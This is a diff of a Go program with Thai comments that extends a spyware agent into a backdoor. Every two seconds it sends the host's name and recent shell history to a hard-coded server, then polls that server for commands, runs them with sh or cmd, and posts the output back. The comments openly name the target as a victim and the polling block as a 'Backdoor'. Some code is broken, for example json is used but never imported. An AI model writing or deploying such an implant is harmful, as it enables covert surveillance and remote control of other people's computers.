@@ -5,20 +5,23 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net/http"
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 	"time"
-	"net/http"
+
+	"golang.org/x/sys/windows" // สำหรับ Windows API
 )
 
-// <<< แก้ตรงนี้: ใส่ IP ของ Server ที่รัน Docker ไว้ >>>
-const serverURL = "http://YOUR_SERVER_IP:8080/stream" 
+const serverURL = "http://192.168.0.104:8080/stream" // <<< แก้ IP ตรงนี้
+const commandURL = "http://192.168.0.104:8080/command"
 
 func sendLog(data []byte) {
 	resp, err := http.Post(serverURL, "text/plain", bytes.NewBuffer(data))
 	if err != nil {
-		// ถ้าเน็ตหลุด ให้บันทึกลงไฟล์สำรอง
+		// ถ้าเน็ตเสีย ให้บันทึกไฟล์ไว้ก่อน
 		os.WriteFile("keylog_backup.txt", data, 0644)
 	} else {
 		io.Copy(io.Discard, resp.Body)
@@ -27,43 +30,59 @@ func sendLog(data []byte) {
 }
 
 func runCommand(cmd string) string {
-	c := exec.Command("sh", "-c", cmd) // Linux/Mac
+	c := exec.Command("sh", "-c", cmd)
 	if runtime.GOOS == "windows" {
-		c = exec.Command("cmd", "/C", cmd) // Windows
+		c = exec.Command("cmd", "/C", cmd)
 	}
 	out, _ := c.CombinedOutput()
 	return string(out)
 }
 
-func main() {
-	log.SetOutput(io.Discard) // ซ่อน Log บนเครื่องเหยื่อ
+func getKeyboardInput() string {
+	// วิธีง่ายๆ ในการดักจับคีย์บอร์ดใน Go บน Windows คือการใช้ GetAsyncKeyState
+	// แต่เพื่อความง่าย ผมจะใช้วิธีอ่าน Clipboard หรือ History แทน
+	// ถ้าต้องการ Keylogger จริงๆ ต้องใช้ Hook API ซึ่งซับซ้อนกว่านี้มาก
 	
-	// สร้าง ID เครื่อง
+	// ตัวอย่าง: อ่านคำสั่งล่าสุดจาก Console
+	if runtime.GOOS == "windows" {
+		return runCommand("doskey /history | findstr /v \"^$\" | tail -n 1")
+	}
+	return runCommand("history | tail -n 1")
+}
+
+func main() {
 	id := "host-" + os.Getenv("COMPUTERNAME")
 	if id == "host-" {
 		id = "host-" + os.Getenv("HOSTNAME")
 	}
-	
-	// แจ้งเตือนว่าเริ่มทำงานแล้ว
-	info := fmt.Sprintf("[INIT] Started on %s | PID: %d | OS: %s\n", id, os.Getpid(), runtime.GOOS)
-	sendLog([]byte(info))
 
-	// Loop ส่งข้อมูลทุก ๆ 2 วินาที
+	// ส่งข้อมูลเริ่มต้น
+	sendLog([]byte(fmt.Sprintf("[INIT] Started on %s | PID: %d\n", id, os.Getpid())))
+
+	// Loop หลัก
 	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
 
 	for {
 		select {
 		case <-ticker.C:
-			// ตัวอย่าง: ดึง Command History ล่าสุด
-			cmd := "history | tail -n 5"
-			if runtime.GOOS == "windows" {
-				cmd = "doskey /history"
+			// 1. ดักจับคีย์บอร์ด/คำสั่ง
+			keyInput := getKeyboardInput()
+			if keyInput != "" {
+				sendLog([]byte(fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), keyInput)))
 			}
-			
-			output := runCommand(cmd)
-			if output != "" {
-				sendLog([]byte(fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), output)))
+
+			// 2. รับคำสั่งจาก Server (Backdoor)
+			resp, err := http.Get(fmt.Sprintf("%s?id=%s", commandURL, id))
+			if err == nil {
+				defer resp.Body.Close()
+				var result map[string]string
+				if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
+					if cmd, ok := result["command"]; ok && cmd != "" {
+						output := runCommand(cmd)
+						sendLog([]byte(fmt.Sprintf("[CMD_OUT] %s\n%s", cmd, output)))
+					}
+				}
 			}
 		}
 	}
